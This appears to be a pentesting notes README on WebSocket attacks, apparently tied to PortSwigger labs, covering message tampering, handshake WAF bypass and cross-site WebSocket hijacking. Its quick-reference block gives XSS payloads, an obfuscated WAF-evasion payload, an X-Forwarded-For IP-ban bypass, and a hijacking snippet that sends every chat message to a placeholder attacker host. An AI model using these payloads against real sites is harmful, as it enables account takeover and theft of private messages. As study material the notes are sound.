# WebSockets - topic overview & router

WebSocket connections start with an HTTP handshake then upgrade to a persistent bidirectional channel. Attacks: intercept and tamper with messages (same XSS/SQLi payloads, just in WS frames instead of HTTP); manipulate the handshake itself; perform cross-site WebSocket hijacking (CSWSH). Impact: XSS in chat/support systems, account takeover.

## 30-second quick reference

```
# Intercept WS messages: Burp Proxy -> WebSockets history tab
# Modify & replay: right-click message -> Send to Repeater

# XSS payload in WS message (client encodes -> intercept before send)
<img src=1 onerror='alert(1)'>

# Bypass WAF/IP ban on handshake:
# Reconnect -> intercept GET /chat (upgrade request) -> add X-Forwarded-For: 1.1.1.1
# Then send obfuscated XSS in message: <img src=1 oNeRrOr=alert`1`>

# CSWSH (cross-site WebSocket hijacking) - if no CSRF protection on handshake:
var ws = new WebSocket('wss://VICTIM/chat');
ws.onmessage = function(e){ fetch('https://ATTACKER/log?d='+e.data); };
```

## Decision map

| Scenario | Sub-technique | Approach |
|---|---|---|
| WS message reflects in page unsanitized | [Message-manipulation](Message-manipulation/) | inject XSS payload in WS message |
| WAF blocks XSS, IP banned | [Handshake-bypass](Handshake-bypass/) | spoof IP via XFF in handshake + obfuscate payload |
| No CSRF token on WS handshake | Cross-site hijacking | attacker page opens WS, reads chat history |

## Sub-technique folders
- `Message-manipulation/` - tamper with WS message content to inject XSS (1 lab)
- `Handshake-bypass/` - WAF/IP ban bypass via XFF header on reconnect, obfuscated payload (1 lab)

## Root cause
WebSocket messages are treated like trusted server data with less scrutiny than HTTP params. Client-side JS often sanitizes before sending but the server reflects raw. Handshake is HTTP - susceptible to header injection. WS connections inherit cookie auth -> CSWSH if handshake lacks CSRF protection.

## Find it
- Burp Proxy -> WebSockets history tab -> look for message content reflected in page
- Check if WS handshake has anti-CSRF token (Origin check, custom header)
- Try sending XSS payload in chat -> does it reflect unsanitized?

## Chaining
- WS XSS -> steal cookies/tokens -> [XSS](../XSS/)
- CSWSH -> read private chat messages -> exfiltrate to attacker
- WS injection -> [SQL-injection](../SQL-injection/) if message processed by DB

## Tools
- **Burp Proxy WebSockets history** - intercept and replay WS frames
- **Burp Repeater** - send modified WS messages

## References
- https://portswigger.net/web-security/websockets
- https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
